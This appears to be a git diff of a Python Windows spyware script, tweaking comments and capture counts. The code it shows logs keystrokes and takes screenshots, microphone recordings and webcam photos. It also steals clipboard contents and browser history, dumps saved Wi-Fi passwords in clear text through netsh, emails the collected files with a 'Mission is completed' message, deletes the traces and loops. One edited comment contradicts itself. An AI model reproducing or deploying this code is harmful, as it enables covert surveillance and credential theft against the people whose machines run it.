@@ -2,7 +2,7 @@ import subprocess                                   # Used to run new applicatio
 import socket                                       # Used to write to Internet servers
 import win32clipboard                               # System grabs the most recent clipboard data and saves it to a file
 import os                                           # Provides functions for interacting with the operating system
-import re                                           # Helps you match or find other strings or sets of strings
+import re                                          # Helps you match or find other strings or sets of strings
 import smtplib                                      # Defines an SMTP client session object
 import logging                                      # Allows writing status messages to a file or any other output streams
 import pathlib                                      # Deals with path related tasks
@@ -23,7 +23,7 @@ from email.mime.text import MIMEText                # Sending text emails
 from email.mime.base import MIMEBase                # Adds a Content-Type header
 from email import encoders
 
-################ Functions: Keystorke Capture, Screenshot Capture, Mic Recroding, Webcam Snapshot, Email Sending ################
+################ This code block includes Keystorke Capture, Screenshot Capture, Mic Recroding, Webcam Snapshot, Email Sending ################
 
 # Keystroke Capture Funtion
 def logg_keys(file_path):
@@ -37,19 +37,20 @@ def screenshot(file_path):
     pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
     screen_path = file_path + 'Screenshots\\'
 
-    for x in range(0,10):
+    for x in range(0,10): # Limit Amount of pics generated 
         pic = ImageGrab.grab()
         pic.save(screen_path + 'screenshot{}.png'.format(x))
-        time.sleep(5)                               # Gap between the each screenshot in sec
+        time.sleep(3)                            #Time gap between the each screenshot in sec
 
 # Loop that save a picture every 5 seconds
-def microphone(file_path):
-    for x in range(0, 5):
-        fs = 44100
-        seconds = 10
+def microphone(file_path): #Limit Amount of audio files generated
+    for x in range(0, 10):
+        fs = 44100 
+        seconds = 15
         myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
         sounddevice.wait()                          # To check if the recording is finished
         write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)
+
 
 # Webcam Snapshot Function #
 def webcam(file_path):
@@ -57,20 +58,21 @@ def webcam(file_path):
     cam_path = file_path + 'WebcamPics\\'
     cam = cv2.VideoCapture(0)
 
-    for x in range(0, 10):
+    for x in range(0, 30): # Limit Amount of webcam pics captured
         ret, img = cam.read()
-        file = (cam_path  + '{}.jpg'.format(x))
-        cv2.imwrite(file, img)
-        time.sleep(5)
+        file = (cam_path  + '{}.jpg'.format(x)) 
+        cv2.imwrite(file, img) 
+        time.sleep(5) 
 
     cam.release                                     # Closes video file or capturing device
     cv2.destroyAllWindows
 
+#Email system function #
 def email_base(name, email_address):
     name['From'] = email_address
     name['To'] =  email_address
     name['Subject'] = 'Success!!!'
-    body = 'Mission is completed'
+    body = 'Mission is completed' 
     name.attach(MIMEText(body, 'plain'))
     return name
 
@@ -144,7 +146,7 @@ def main():
             commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 'folder=C:\\Users\\Public\\Logs\\', 'key=clear', 
                                         '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route', 'print', '&',
                                         'netstat', '-a'], stdout=network_wifi, stderr=network_wifi, shell=True)
-            # The communicate funtion is used to initiate a 60 second timeout for the shell.
+            # The communicate function is used to activate a 60 second timeout for the shell.
             outs, errs = commands.communicate(timeout=60)   
 
         except subprocess.TimeoutExpired:
@@ -179,7 +181,7 @@ def main():
     with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
         clipboard_info.write('Clipboard Data: \n' + pasted_data)
 
-    # Get the browser username, database paths, and history in JSON format
+    # Gets the browser username, database paths, and history in JSON format
     browser_history = []
     bh_user = bh.get_username()
     db_path = bh.get_database_paths()
@@ -231,13 +233,13 @@ def main():
     send_email('C:\\Users\\Public\\Logs\\Screenshots')
     send_email('C:\\Users\\Public\\Logs\\WebcamPics')
 
-    shutil.rmtree('C:\\Users\\Public\\Logs')                        # Clean Up Files
+    shutil.rmtree('C:\\Users\\Public\\Logs')                        # Cleans Up Files saved in Public/Log folder
 
-    main()                                                          # Loop
+    main()                                                          # Loops from here onwards
 
 
-# When an error occurs a detailed full stack trace can be logged to a file for an admin;
-# while the user receives a much more vague message preventing information leakage.
+# When an error occurs a detailed full stack trace can be logged to a file for the admin;
+# while the user receives a much more detailed message preventing information leakage.
 
 if __name__ == '__main__':
     try:
